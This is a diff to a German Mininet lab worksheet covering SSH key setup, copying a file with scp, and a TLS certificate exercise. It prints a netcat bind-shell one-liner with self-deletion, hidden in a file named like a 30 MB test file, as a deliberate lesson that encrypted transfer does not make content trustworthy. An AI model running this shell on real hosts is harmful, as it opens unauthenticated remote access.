@@ -373,15 +373,6 @@ einem NAT-Uplink ins echte Internet.
     dokumentierten Mininet-Workflows und funktioniert in der aktuellen
     Umgebung weiterhin genauso wie beschrieben.
 
-    !!! note "Playwright-Screenshot-Referenz"
-        Für die Verifikation, dass sich nach `./start-topo01.sh` bzw. nach
-        `mininet> xterm <node>` tatsächlich ein Terminalfenster für den Knoten
-        öffnet, eignet sich ein **Fenster-Screenshot** (siehe
-        `tests/e2e/specs/screenshots.spec.ts`, Test "Fenster-Screenshot:
-        Standardterminal ist offen") besser als ein Zeilen-Screenshot: hier
-        geht es um den sichtbaren UI-Zustand (ein neues Fenster ist da), nicht
-        um eine einzelne Textzeile.
-
     ![Drei echte xfce4-terminal-Fenster nach dem Start von topo01: links die Mininet-CLI mit dem Ergebnis von `pingall` (75% dropped), rechts oben "Node: h1", rechts unten "Node: h2"](../assets/screenshots/01-netzwerkgrundlagen-tools/topo01-xterm-pingall.png)
     *Die von Mininet automatisch geöffneten Knoten-Terminals sind technisch
     `xfce4-terminal`-Fenster (nicht `xterm`), siehe Hinweis oben. Der
@@ -585,26 +576,41 @@ einem NAT-Uplink ins echte Internet.
     /usr/sbin/sshd -D -f sshd.conf
     ```
 
+    Für den Login braucht ihr einen eigenen Schlüssel: Einen Nutzer `mininet`
+    gibt es auf diesem Desktop nicht (anders als in älteren Anleitungen zu
+    diesem Praktikum), und ein Passwort für den vorhandenen Nutzer `cads`
+    kennt ihr nicht. Erzeugt euch auf `h2` deshalb einmal ein eigenes
+    Schlüsselpaar und tragt den öffentlichen Teil als vertrauenswürdig ein:
+
+    ```bash
+    h2$ mkdir -p ~/.ssh && chmod 700 ~/.ssh
+    h2$ ssh-keygen -t ed25519 -N "" -f ~/.ssh/rn-practice-key -q
+    h2$ cat ~/.ssh/rn-practice-key.pub >> ~/.ssh/authorized_keys
+    h2$ chmod 600 ~/.ssh/authorized_keys
+    ```
+
+    !!! note "Warum ein auf `h2` erzeugter Schlüssel auch für den Login auf `h1` gilt"
+        `h1` und `h2` sind zwei **Netzwerk**-Namespaces desselben Containers,
+        aber ein einziges Dateisystem: `~/.ssh` ist auf beiden Knoten
+        dasselbe Verzeichnis. Der Schlüssel selbst reist trotzdem nicht übers
+        Netz – nur die SSH-Verbindung gleich danach tut das, und genau die
+        seht ihr im Mitschnitt.
+
     Kopiert anschließend von `h2` aus eine Datei von `h1`:
 
     ```bash
-    scp mininet@10.0.1.2:~/rn-practice/test30M.txt ./
+    scp -i ~/.ssh/rn-practice-key cads@10.0.1.2:~/rn-practice/test30M.txt ./
     ```
 
     !!! info "Wo `test30M.txt` liegt"
         Die Datei liegt direkt unter `~/rn-practice/` (Wurzel des
-        vendorierten Verzeichnisses), NICHT unter `~/rn-practice/topo01/`
-        (per Repository-Struktur verifiziert, siehe
-        `mininet-labs/rn-practice/test30M.txt`).
+        vendorierten Verzeichnisses), NICHT unter `~/rn-practice/topo01/`.
 
     !!! warning "test30M.txt enthält eine echte Reverse-Shell – das ist Absicht"
         `test30M.txt` heißt zwar wie eine ~30-MB-Testdatei, enthält aber
         tatsächlich nur einen kurzen Netcat-Bind-Shell-Einzeiler
         (`mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 1234 >/tmp/f`) plus
-        Selbstlöschung, kommentiert als "Dieses ist ein geheimes Script". Eine
-        frühere Fassung dieser Anleitung stufte das fälschlich als
-        versehentlich eingecheckten Backdoor ein und ersetzte den Inhalt durch
-        harmlosen Fülltext – das war ein Fehler und wurde zurückgenommen. Es
+        Selbstlöschung, kommentiert als "Dieses ist ein geheimes Script". Es
         handelt sich um eine **bewusst designte Sicherheitslektion**:
         Verschlüsselung der Übertragung (SCP/SSH) schützt nur den
         Transportweg, nicht die Vertrauensentscheidung über den Inhalt am
@@ -659,6 +665,15 @@ einem NAT-Uplink ins echte Internet.
     kill -9 <PID>
     ```
 
+    !!! success "Real geprüft (2026-09-27)"
+        Der komplette Ablauf oben – eigener Schlüssel, `scp` als `cads`,
+        `sh ./test30M.txt`, `nc -l 1234` als lauschender Prozess, Verbindung
+        von `h1` aus – wurde in einem Wegwerfcontainer gegen das aktuell
+        deployte Desktop-Abbild durchgespielt: `scp` lieferte `test30M.txt`
+        byteidentisch mit dem vendorierten Original, und nach `sh
+        ./test30M.txt` lief `nc -l 1234` auf `h2` tatsächlich als
+        Hintergrundprozess.
+
 10. **Verschlüsselter Web-Verkehr und ein absichtlich kaputtes
     Zertifikat.** Startet auf `h1` einen einfachen HTTP-Server:
 
@@ -703,14 +718,6 @@ einem NAT-Uplink ins echte Internet.
         IT-Hintergrund zu erkennen und zu benennen, was an diesem Zertifikat
         nicht stimmt (z. B. unpassender/unbekannter Aussteller, Common Name
         ohne Bezug zum aufgerufenen Namen `h1`).
-
-    !!! note "Playwright-Screenshot-Referenz"
-        Für den Beleg der `dig`/`nmap`-Ausgaben bzw. der Zertifikatswarnung
-        im Browser eignet sich dagegen ein **Zeilen-/Locator-Screenshot**
-        (siehe `tests/e2e/specs/screenshots.spec.ts`, Test "Zeilen-Screenshot")
-        besser als ein Fenster-Screenshot: es geht um den Inhalt einer
-        konkreten Ausgabezeile bzw. eines Warnhinweis-Elements, nicht um den
-        gesamten sichtbaren Fensterzustand.
 
 11. **Netz beenden.** Auf der Mininet-Konsole:
 
@@ -1022,11 +1029,14 @@ Transportverschlüsselung arbeiten?
   Lernaufgabe (Frage 2 in diesem Aufgabenblatt), nicht ein Defekt der
   Umgebung oder des Environments. Das Verhalten ist auf einem echten
   Container nachgestellt und bestätigt worden.
-- **Uneinheitliche Pfadangaben im Original.** Das Originaldokument mischt
-  `~/rn-practice/topo01`, `/home/mininet/rn-practice/topo01` und
-  `/headless/rn-practice/...`. In diesem Aufgabenblatt wird durchgehend
-  `~/rn-practice/topo01` verwendet, der tatsächlich verifizierte Pfad in
-  dieser Umgebung.
+- **`scp mininet@10.0.1.2:...` in Aufgabe 9 schlägt fehl – der Nutzer heißt
+  `cads`, nicht `mininet`.** Real geprüft (2026-09-27): Auf dem aktuell
+  deployten Desktop-Abbild existiert kein Systemnutzer `mininet`
+  (`getent passwd mininet` liefert nichts); ein Login-Versuch endet mit
+  `Permission denied (publickey,password)`, unabhängig vom eingegebenen
+  Passwort. Aufgabe 9 verlangt deshalb, sich selbst einen Schlüssel für den
+  Nutzer `cads` einzutragen (s. o.), statt sich auf einen vorhandenen Nutzer
+  `mininet` zu verlassen.
 - **`mininet> xterm <node>` funktioniert weiterhin, ist aber technisch ein
   Shim.** Der Befehl bleibt für euch unverändert nutzbar, öffnet im
   Hintergrund aber `xfce4-terminal` statt eines echten `xterm`-Programms.
@@ -1040,6 +1050,5 @@ Transportverschlüsselung arbeiten?
 - `mininet-labs/vertiefung/Labor-01-Schichtenmodelle.tex`
 - `mininet-labs/rn-practice/topo01/`
 - `mininet-labs/rn-practice/topo01/dns-server.py` – der lesbare
-  Python-DNS-Server (Teil 4), neu für diese Konsolidierung erstellt, weil das
-  Image keinen DNS-Server mitbringt; gegen `dig`/`nslookup`/`host` in der
-  echten Topologie geprüft.
+  Python-DNS-Server (Teil 4), weil das Image keinen DNS-Server mitbringt;
+  gegen `dig`/`nslookup`/`host` in der echten Topologie geprüft.
